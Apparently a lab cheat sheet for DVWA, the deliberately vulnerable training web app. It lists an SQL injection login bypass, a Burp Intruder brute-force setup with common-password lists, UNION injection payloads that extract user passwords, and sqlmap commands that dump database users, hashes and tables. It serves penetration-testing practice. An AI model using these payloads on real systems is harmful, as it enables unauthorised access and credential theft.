# DVWA - Damn Vulnerable Web Application

![](assets/picture01.png) 

## 1. Test SQL injection to bypass authentication
username = admin'#
pass = <blank>

## 2. Use Bursuite to brute force
2.1. Capture the request
2.2. Send to intruder
2.3. Select the Cluster Bomb
2.4. Set payloads
2.5. Start attack

List of usernames to Use
user
carlos
admin
superadmin

List of passwords to Use (top passwords od 2022)
123456
123456789
qwerty
password
12345
qwerty123
1q2w3e
12345678
111111
1234567890

## 3. SQL injection
    a' OR ''='

    ' union select 1,@@version#

    ' union select null,schema_name from information_schema.schemata #

    ' union select null,concat(first_name,0x0a,password) from users #

## 4. Blind SQL injection with SQLmap
### Lists databases
    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" –dbs
### Lists the tables on a specific database
    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --tables
### Lists all users
    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" –users
### Users and passwords
    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" --users --passwords
### Get tables structure
    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --columns
### Dump database information
    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --dump